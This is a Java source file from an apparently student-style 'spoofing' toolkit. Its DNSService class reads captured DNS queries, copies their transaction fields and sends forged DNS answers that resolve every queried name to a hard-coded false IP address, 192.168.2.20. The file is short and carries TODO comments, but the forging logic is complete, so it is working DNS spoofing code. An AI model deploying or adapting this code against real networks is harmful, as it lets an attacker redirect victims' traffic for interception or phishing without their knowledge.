package org.bitducks.spoofing.services;

import java.net.InetAddress;
import java.net.UnknownHostException;
import java.nio.ByteBuffer;

import jpcap.packet.UDPPacket;

import org.bitducks.spoofing.core.Server;
import org.bitducks.spoofing.core.Service;
import org.bitducks.spoofing.packet.DNSPacket;
import org.bitducks.spoofing.packet.PacketFactory;

public class DNSService extends Service {
	private InetAddress falseIpAddr = null;
	
	public DNSService(Server server) {
		super(server);
		
		// TODO Add rule
		
		// TODO Get our IP or the IP provided
		this.setDNSFalseIp("192.168.2.20");
	}
	
	public void setDNSFalseIp(String falseHostIp) {
		try {
			this.falseIpAddr = InetAddress.getByName(falseHostIp);
		} catch (UnknownHostException e) {
			e.printStackTrace();
		}		
	}

	@Override
	public void run() {
		
		UDPPacket queryPaquet = null;
		while ((queryPaquet = (UDPPacket)this.getNextPacket()) != null) {
					
				// Getting the query part of the packet
				byte[] queryData = queryPaquet.data;
				ByteBuffer queryBuffer = ByteBuffer.allocate(queryData.length - 54);
				for (int i = 54; i < queryData.length; ++i) {
					queryBuffer.put(queryData[i]);
				}
				
				
				DNSPacket answerPaquet = PacketFactory.dnsRequest(queryPaquet.dst_port, 
						queryPaquet.src_port, 
						queryPaquet.dst_ip, 
						queryPaquet.src_ip, 
						new byte[] { queryData[42], queryData[43] }, 
						new byte[] { queryData[46], queryData[47] }, 
						queryData, 
						this.falseIpAddr);
				
				this.getServer().sendPacket(answerPaquet);
		}		
	}

}
